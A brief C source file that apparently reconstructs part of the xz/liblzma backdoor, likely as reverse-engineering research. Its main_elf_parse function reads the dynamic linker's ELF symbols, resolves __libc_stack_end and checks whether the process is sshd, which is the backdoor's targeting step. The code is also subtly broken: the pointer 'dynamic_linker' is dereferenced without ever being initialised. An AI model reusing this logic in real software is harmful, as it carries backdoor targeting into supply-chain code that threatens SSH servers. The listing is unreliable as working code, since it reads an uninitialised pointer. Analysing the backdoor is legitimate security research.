/**
 * Copyright (C) 2024 Stefano Moioli <smxdev4@gmail.com>
 **/
#include "xzre.h"
#include <elf.h>

BOOL main_elf_parse(main_elf_t *main_elf){
	if(!elf_parse(
		main_elf->dynamic_linker_ehdr,
		main_elf->elf_handles->dynamic_linker
	)){
		return FALSE;
	}
	Elf64_Sym *libc_stack_end_sym;
	if(!(libc_stack_end_sym = elf_symbol_get(
		main_elf->elf_handles->dynamic_linker,
		STR_libc_stack_end,
		STR_GLIBC_2_2_5
	))){
		return FALSE;
	}
	elf_info_t *dynamic_linker;
	void **libc_stack_end_ptr = (void *)PTRADD(dynamic_linker->elfbase, libc_stack_end_sym->st_value);
	if(!process_is_sshd(dynamic_linker, *libc_stack_end_ptr)){
		return FALSE;
	}
	*main_elf->__libc_stack_end = *libc_stack_end_ptr;
	return TRUE;
}
